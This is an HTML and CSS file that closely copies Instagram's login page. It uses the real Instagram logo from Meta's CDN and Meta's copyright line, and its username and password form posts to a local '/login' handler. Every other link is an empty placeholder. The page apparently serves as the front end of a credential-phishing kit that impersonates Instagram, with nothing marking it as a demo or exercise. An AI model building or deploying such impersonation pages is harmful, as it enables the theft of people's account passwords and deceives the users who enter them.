<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Global Styles */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
            justify-content: center;
        }

        /* Login Container */
        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
        }

        .login-box {
            border: 1px solid #262626;
            background-color: #000;
            padding: 40px 40px;
            width: 100%;
            margin-bottom: 10px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top:25px;
            
        }
        
        /* Make the form and buttons take up more horizontal space */
        form {
            width: 100%;
        }

        /* Instagram Logo */
        .instagram-logo {
            font-family: 'Billabong', cursive;
            font-size: 40px;
            margin-bottom: 30px;
            color: #fff;
        }

        /* Form Elements */
        .form-group {
            width: 100%;
            margin-bottom: 6px;
        }

        input {
            background-color: #121212;
            border: 1px solid #262626;
            color: #fff;
            padding: 12px 10px;
            border-radius: 4px;
            width: 100%;
            font-size: 12px;
            margin-bottom: 10px;
        }

        input::placeholder {
            color: #8e8e8e;
        }

        .login-btn {
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 7px 0;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            font-size: 14px;
            margin: 8px 0;
        }

        .login-btn:hover {
            background-color: #0086e0;
        }

        .separator {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 15px 0;
        }

        .separator-line {
            flex-grow: 1;
            height: 1px;
            background-color: #262626;
        }

        .separator-text {
            margin: 0 18px;
            font-size: 13px;
            font-weight: 600;
            color: #8e8e8e;
        }

        /* Facebook Login */
        .fb-login {
            display: flex;
            align-items: center;
            color: #1877f2;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin: 10px 0;
        }

        .fb-icon {
            margin-right: 8px;
            color: #1877f2;
        }

        .forgot-password {
            color: #0095f6;
            font-size: 12px;
            text-decoration: none;
            margin: 12px 0;
        }

        /* Sign Up Box */
        .signup-box {
            border: 1px solid #262626;
            background-color: #000;
            padding: 20px;
            text-align: center;
            width: 100%;
            margin-bottom: 10px;;
        }

        .signup-text {
            font-size: 14px;
            color: #fff;
        }

        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        /* Footer */
        .footer {
            margin-top: auto;
            padding: 20px 0;
            text-align: center;
            width: 100%;
            max-width: 820px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 18px;
        }

        .footer-link {
            color: #8e8e8e;
            font-size: 12px;
            margin: 0 8px 12px 8px;
            text-decoration: none;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .language-selector {
            margin-right: 10px;
            background: transparent;
            border: none;
            color: #8e8e8e;
            font-size: 12px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <main class="login-container">
        <div class="login-box">
            <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yB/r/E7m8ZCMOFDS.png&quot;); background-position: 0px 0px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block; margin-top: 35px; margin-bottom: 35px;"></i>
            <form action="/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" aria-label="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" aria-label="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="separator">
                <div class="separator-line"></div>
                <div class="separator-text">OR</div>
                <div class="separator-line"></div>
            </div>
            <a href="#" class="fb-login">
                <span class="fb-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#1877f2">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                </span>
                Log in with Facebook
            </a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        <div class="signup-box">
            <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">Meta</a>
            <a href="#" class="footer-link">About</a>
            <a href="#" class="footer-link">Blog</a>
            <a href="#" class="footer-link">Jobs</a>
            <a href="#" class="footer-link">Help</a>
            <a href="#" class="footer-link">API</a>
            <a href="#" class="footer-link">Privacy</a>
            <a href="#" class="footer-link">Terms</a>
            <a href="#" class="footer-link">Locations</a>
            <a href="#" class="footer-link">Instagram Lite</a>
            <a href="#" class="footer-link">Threads</a>
            <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
            <a href="#" class="footer-link">Meta Verified</a>
        </div>
        <div class="copyright">
            <select class="language-selector" aria-label="Switch Language">
                <option value="en">English</option>
            </select>
            <span>Â© 2025 Instagram from Meta</span>
        </div>
    </footer>
</body>
</html>
